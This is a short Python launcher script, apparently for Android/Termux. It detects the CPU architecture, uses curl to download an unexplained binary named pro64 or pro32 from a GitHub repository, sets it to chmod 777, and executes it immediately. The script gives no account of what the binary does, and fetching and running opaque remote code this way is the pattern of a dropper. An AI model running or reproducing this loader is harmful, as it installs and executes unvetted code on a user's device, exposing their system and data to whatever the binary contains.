#utf-8 orginal write rana aahil
import os,sys,subprocess
try:
    import requests
except:
    os.system("pip install requests")
cwd = subprocess.check_output('uname -om', shell=True)
cwd = str(cwd)
if 'aarch64' in cwd:
    if not os.path.isfile('pro64'):
        os.system('curl -L https://github.com/rsaprogrammers/modules_exec/blob/main/64bit/pro64?raw=true > pro64')
        os.system('chmod 777 pro64')
        os.system('./pro64')
    else:
        os.system('./pro64')
elif 'arm' in cwd:
    if not os.path.isfile('pro32'):
        os.system('curl -L https://github.com/rsaprogrammers/modules_exec/blob/main/32bit/pro32?raw=true > pro32')
        os.system('chmod 777 pro32')
        os.system('./pro32')
    else:
        os.system('./pro32')
else:
    exit(" we can't find your bit sory :) ")
